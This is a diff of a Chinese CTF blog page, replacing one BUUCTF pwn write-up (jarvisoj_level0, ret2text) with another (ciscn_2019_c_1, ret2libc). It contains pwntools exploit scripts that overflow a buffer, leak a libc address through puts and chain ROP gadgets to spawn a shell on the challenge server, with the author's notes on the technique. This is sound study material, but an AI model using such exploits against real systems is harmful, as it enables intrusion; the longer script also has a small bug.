@@ -22,28 +22,35 @@
 
 <script class="next-config" data-name="main" type="application/json">{"hostname":"lmarch2.github.com","root":"/","images":"/images","scheme":"Gemini","darkmode":"ture","version":"8.14.1","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":true,"style":"mac"},"bookmark":{"enable":true,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":true,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
 
-    <meta name="description" content="Week4&amp;&amp;Week5 T1  jarvisoj_level02023-01-20WPBUUCTF pwn 第六题考点： 简单栈溢出&#x2F;基本rop ret2text">
+    <meta name="description" content="T5 ciscn_2019_c_1 2023-01-30WPBUUCTF pwn 题考点：栈溢出 ret2libc3">
 <meta property="og:type" content="article">
-<meta property="og:title" content="week4 T1">
-<meta property="og:url" content="http://lmarch2.github.com/posts/64ef4d6b/index.html">
+<meta property="og:title" content="week4&amp;&amp;week5-T5">
+<meta property="og:url" content="http://lmarch2.github.com/posts/95338453/index.html">
 <meta property="og:site_name" content="lmarch2&#39;blog">
-<meta property="og:description" content="Week4&amp;&amp;Week5 T1  jarvisoj_level02023-01-20WPBUUCTF pwn 第六题考点： 简单栈溢出&#x2F;基本rop ret2text">
+<meta property="og:description" content="T5 ciscn_2019_c_1 2023-01-30WPBUUCTF pwn 题考点：栈溢出 ret2libc3">
 <meta property="og:locale" content="zh_CN">
-<meta property="article:published_time" content="2023-01-20T15:36:57.000Z">
-<meta property="article:modified_time" content="2023-04-01T07:30:57.754Z">
+<meta property="og:image" content="https://pic1.zhimg.com/80/v2-8b7794a415c00fa88ea4eab73b44e060_1440w.webp">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/2020082517155968.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21jbXV5YW5nYQ==,size_16,color_FFFFFF,t_70#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200825172042284.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21jbXV5YW5nYQ==,size_16,color_FFFFFF,t_70#pic_center">
+<meta property="og:image" content="https://pic2.zhimg.com/80/v2-64d98b53873c335d7f889b202b92fb9d_1440w.webp">
+<meta property="og:image" content="https://pic1.zhimg.com/80/v2-5fb909989f2a46201c004e96d46f6890_1440w.webp">
+<meta property="og:image" content="https://pic2.zhimg.com/80/v2-ffa2e57740c5b5b7047a9a03f3183039_1440w.webp">
+<meta property="article:published_time" content="2023-04-01T07:36:00.000Z">
+<meta property="article:modified_time" content="2023-04-01T07:42:32.481Z">
 <meta property="article:author" content="lmarch2">
 <meta property="article:tag" content="ctf BUUCTF">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://pic1.zhimg.com/80/v2-8b7794a415c00fa88ea4eab73b44e060_1440w.webp">
 
 
-<link rel="canonical" href="http://lmarch2.github.com/posts/64ef4d6b/">
+<link rel="canonical" href="http://lmarch2.github.com/posts/95338453/">
 
 
 
-<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"http://lmarch2.github.com/posts/64ef4d6b/","path":"posts/64ef4d6b/","title":"week4 T1"}</script>
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"http://lmarch2.github.com/posts/95338453/","path":"posts/95338453/","title":"week4&&week5-T5"}</script>
 
 <script class="next-config" data-name="calendar" type="application/json">""</script>
-<title>week4 T1 | lmarch2'blog</title>
+<title>week4&&week5-T5 | lmarch2'blog</title>
   
 
 
@@ -143,7 +150,7 @@
       <div class="sidebar-panel-container">
         <!--noindex-->
         <div class="post-toc-wrap sidebar-panel">
-            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Week4-amp-amp-Week5-T1-jarvisoj-level0"><span class="nav-text">Week4&amp;&amp;Week5 T1  jarvisoj_level0</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x01"><span class="nav-text">0x01</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x02"><span class="nav-text">0x02</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x03"><span class="nav-text">0x03</span></a></li></ol></li></ol></div>
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#T5-ciscn-2019-c-1"><span class="nav-text">T5 ciscn_2019_c_1</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x01"><span class="nav-text">0x01</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x02"><span class="nav-text">0x02</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x03"><span class="nav-text">0x03</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x04"><span class="nav-text">0x04</span></a></li></ol></li></ol></div>
         </div>
         <!--/noindex-->
 
@@ -290,7 +297,7 @@
   
 
   <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://lmarch2.github.com/posts/64ef4d6b/">
+    <link itemprop="mainEntityOfPage" href="http://lmarch2.github.com/posts/95338453/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="https://pic3.zhimg.com/80/v2-ffbdad5d2f9183a625a6a112a4f96b02_1440w.webp">
@@ -303,12 +310,12 @@
     </span>
 
     <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content="week4 T1 | lmarch2'blog">
+      <meta itemprop="name" content="week4&&week5-T5 | lmarch2'blog">
       <meta itemprop="description" content="">
     </span>
       <header class="post-header">
         <h1 class="post-title" itemprop="name headline">
-          week4 T1
+          week4&&week5-T5
         </h1>
 
         <div class="post-meta-container">
@@ -318,15 +325,9 @@
         <i class="far fa-calendar"></i>
       </span>
       <span class="post-meta-item-text">发表于</span>
+      
 
-      <time title="创建时间：2023-01-20 23:36:57" itemprop="dateCreated datePublished" datetime="2023-01-20T23:36:57+08:00">2023-01-20</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar-check"></i>
-      </span>
-      <span class="post-meta-item-text">更新于</span>
-      <time title="修改时间：2023-04-01 15:30:57" itemprop="dateModified" datetime="2023-04-01T15:30:57+08:00">2023-04-01</time>
+      <time title="创建时间：2023-04-01 15:36:00 / 修改时间：15:42:32" itemprop="dateCreated datePublished" datetime="2023-04-01T15:36:00+08:00">2023-04-01</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -352,14 +353,14 @@
         <i class="far fa-file-word"></i>
       </span>
       <span class="post-meta-item-text">本文字数：</span>
-      <span>395</span>
+      <span>2.2k</span>
     </span>
     <span class="post-meta-item" title="阅读时长">
       <span class="post-meta-item-icon">
         <i class="far fa-clock"></i>
       </span>
       <span class="post-meta-item-text">阅读时长 &asymp;</span>
-      <span>1 分钟</span>
+      <span>2 分钟</span>
     </span>
 </div>
 
@@ -370,13 +371,44 @@
     
     
     <div class="post-body" itemprop="articleBody">
-        <h2 id="Week4-amp-amp-Week5-T1-jarvisoj-level0"><a href="#Week4-amp-amp-Week5-T1-jarvisoj-level0" class="headerlink" title="Week4&amp;&amp;Week5 T1  jarvisoj_level0"></a>Week4&amp;&amp;Week5 T1  jarvisoj_level0</h2><p>2023-01-20WP<br>BUUCTF pwn 第六题<br>考点： 简单栈溢出&#x2F;基本rop ret2text</p>
+        <h2 id="T5-ciscn-2019-c-1"><a href="#T5-ciscn-2019-c-1" class="headerlink" title="T5 ciscn_2019_c_1"></a>T5 ciscn_2019_c_1</h2><blockquote>
+<p>2023-01-30WP<br>BUUCTF pwn 题<br>考点：栈溢出 ret2libc3</p>
+</blockquote>
 <span id="more"></span>
 
-<h3 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h3><p>file checksec —— 64-bit，开NX</p>
-<h3 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h3><p>IDA查看发现main函数里的vulnerable_function()函数里的read函数读取0x200ull，而buf空间只有0x80<br>又找到有system(“&#x2F;bin&#x2F;sh”)<br>返回其地址</p>
-<h3 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h3><p><strong>exp</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">p = remote(&quot;node4.buuoj.cn&quot;,29175)</span><br><span class="line">ret_arr = 0X40059A</span><br><span class="line">payload = b&#x27;a&#x27;*(0x80 + 0x8) + p64(ret_arr)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h3 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h3><p>这不上一题刚做这类？直接模仿一手。。。。<br>file checksec —— 64-bit 开NX</p>
+<h3 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h3><p>运行一下看看</p>
+<p><img data-src="https://pic1.zhimg.com/80/v2-8b7794a415c00fa88ea4eab73b44e060_1440w.webp"></p>
+<p>再看看IDA</p>
+<p><img data-src="https://img-blog.csdnimg.cn/2020082517155968.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21jbXV5YW5nYQ==,size_16,color_FFFFFF,t_70#pic_center"></p>
+<p>研究了半天发现是让你加解密的<br>再看看string window 没用system和binsh<br>又发现加密函数里有gets函数，可构成栈溢出</p>
+<p><img data-src="https://img-blog.csdnimg.cn/20200825172042284.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21jbXV5YW5nYQ==,size_16,color_FFFFFF,t_70#pic_center"></p>
+<h3 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h3><p>分析  是相同的思想，这里不赘述了，大致流程就是</p>
+<ol>
+<li>利用一个程序已经执行过的函数去泄露它在程序中的地址，然后取末尾3个字节，去找到这个程序所使用的libc的版本</li>
+<li>用同一个程序里函数的地址-libc里的函数地址即可得到偏移量</li>
+<li>得到偏移量后就可以推算出程序中其他函数的地址，知道其他函数的地址之后就可以去执行system（’&#x2F;bin&#x2F;sh‘）</li>
+</ol>
+<h3 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h3><p>写exp</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">from LibcSearcher import*</span><br><span class="line"></span><br><span class="line">p=remote(&#x27;node4.buuoj.cn&#x27;,28342)</span><br><span class="line">elf=ELF(&#x27;./ciscn_2019_c_1&#x27;)</span><br><span class="line"></span><br><span class="line">main=0x400b28</span><br><span class="line">pop_rdi=0x400c83</span><br><span class="line">ret=0x4006b9</span><br><span class="line"></span><br><span class="line">puts_plt=elf.plt[&#x27;puts&#x27;]</span><br><span class="line">puts_got=elf.got[&#x27;puts&#x27;]</span><br><span class="line"></span><br><span class="line">p.sendlineafter(&#x27;choice!\n&#x27;,&#x27;1&#x27;)</span><br><span class="line">payload=&#x27;\0&#x27;+&#x27;a&#x27;*(0x50-1+8)</span><br><span class="line">payload+=p64(pop_rdi)</span><br><span class="line">payload+=p64(puts_got)</span><br><span class="line">payload+=p64(puts_plt)</span><br><span class="line">payload+=p64(main)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(&#x27;encrypted\n&#x27;,payload)</span><br><span class="line">p.recvline()</span><br><span class="line">p.recvline()</span><br><span class="line"></span><br><span class="line">puts_addr=u64(r.recvuntil(&#x27;\n&#x27;)[:-1].ljust(8,&#x27;\0&#x27;))</span><br><span class="line">print hex(puts_addr)</span><br><span class="line"></span><br><span class="line">libc=LibcSearcher(&#x27;puts&#x27;,puts_addr)</span><br><span class="line">offset=puts_addr-libc.dump(&#x27;puts&#x27;)</span><br><span class="line">binsh=offset+libc.dump(&#x27;str_bin_sh&#x27;)</span><br><span class="line">system=offset+libc.dump(&#x27;system&#x27;)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(&#x27;choice!\n&#x27;,&#x27;1&#x27;)</span><br><span class="line"></span><br><span class="line">payload=&#x27;\0&#x27;+&#x27;a&#x27;*(0x50-1+8)</span><br><span class="line">payload+=p64(ret)</span><br><span class="line">payload+=p64(pop_rdi)</span><br><span class="line">payload+=p64(binsh)</span><br><span class="line">payload+=p64(system)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(&#x27;encrypted\n&#x27;,payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p><a target="_blank" rel="noopener" href="https://github.com/lieanu/LibcSearcher">libcsearch</a>的github网址<br>安装</p>
+<blockquote>
+<p>git clone <a target="_blank" rel="noopener" href="https://github.com/lieanu/LibcSearcher.git">https://github.com/lieanu/LibcSearcher.git</a><br>cd LibcSearcher<br>sudo python setup.py develop</p>
+</blockquote>
+<p>覆盖数据payload&#x3D;b’\0’+b’a’*(0x50-1+8)<br>\0是为了让加密函数的一个strlen函数停止（这个函数遇‘0’会停止），从而绕过加密，保证我们构造的rop不会被破坏，<br>buf的大小为0x50<br>-1是减去\0<br>+8是覆盖rbp</p>
+<p>这道题的接收非常讲究<br>泄露地址接收时先是两下recvline()，<br>原因</p>
+<blockquote>
+<p>recvline()一次接收到\n;<br>第一次recvline只能到Ciphertext；<br>第二次只能接收到0a<br>第三次的recvuntil才开始处理泄露的got地址。<br>先开一下context_log_lever&#x3D;’debug’，整体看一下， 再自己recvuntil看能接收到什么内容。</p>
+</blockquote>
+<p>然后再用recvuntil(‘\n’)[:-1].ljust(8,’\0’)来舍弃接收到的字符串最后的’\x0’并向左补齐</p>
+<p>还有<br>这一道题是64位的程序，这边涉及到64位程序和32位程序运行时的区别了<br>32位程序运行执行指令的时候直接去内存地址寻址执行<br>64位程序则是通过寄存器来传址，寄存器去内存寻址，找到地址返回给程序<br>因此要用寄存器存参<br>（为什么呢？？还是不理解啊）<br><img data-src="https://pic2.zhimg.com/80/v2-64d98b53873c335d7f889b202b92fb9d_1440w.webp"></p>
+<p>注意栈对齐<br><img data-src="https://pic1.zhimg.com/80/v2-5fb909989f2a46201c004e96d46f6890_1440w.webp"><br>虽然我不懂为什么要……</p>
+<p>还有<br>最后为什么还要再输一个0呢？</p>
+<p><img data-src="https://pic2.zhimg.com/80/v2-ffa2e57740c5b5b7047a9a03f3183039_1440w.webp"></p>
+<p>搞不懂了    <strong>求助</strong></p>
+<p>其实做这题主要还是模仿大佬们写的exp，好多细节都不清楚，但是感觉做了那么久又不能扔在那边等完全懂了再写题解    <del>感觉好浪费</del><br>还得再研究啊 </p>
+<p>参考资料：<br>  <a target="_blank" rel="noopener" href="http://t.csdn.cn/m6si5">[BUUCTF]PWN6——ciscn_2019_c_1</a></p>
+
     </div>
 
     
@@ -403,7 +435,7 @@
   </li>
   <li class="post-copyright-link">
       <strong>本文链接：</strong>
-      <a href="http://lmarch2.github.com/posts/64ef4d6b/" title="week4 T1">http://lmarch2.github.com/posts/64ef4d6b/</a>
+      <a href="http://lmarch2.github.com/posts/95338453/" title="week4&amp;&amp;week5-T5">http://lmarch2.github.com/posts/95338453/</a>
   </li>
   <li class="post-copyright-license">
     <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/zh-CN" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
@@ -480,13 +512,13 @@
 
           <div class="post-nav">
             <div class="post-nav-item">
-                <a href="/posts/fe55b1cb/" rel="prev" title="week3 T5">
-                  <i class="fa fa-chevron-left"></i> week3 T5
+                <a href="/posts/e234b4c5/" rel="prev" title="week4&&week5-T4">
+                  <i class="fa fa-chevron-left"></i> week4&&week5-T4
                 </a>
             </div>
             <div class="post-nav-item">
-                <a href="/posts/0/" rel="next" title="关于分配动态内存编译器警告C6001和C6011">
-                  关于分配动态内存编译器警告C6001和C6011 <i class="fa fa-chevron-right"></i>
+                <a href="/posts/c63e16b3/" rel="next" title="week6-T1">
+                  week6-T1 <i class="fa fa-chevron-right"></i>
                 </a>
             </div>
           </div>
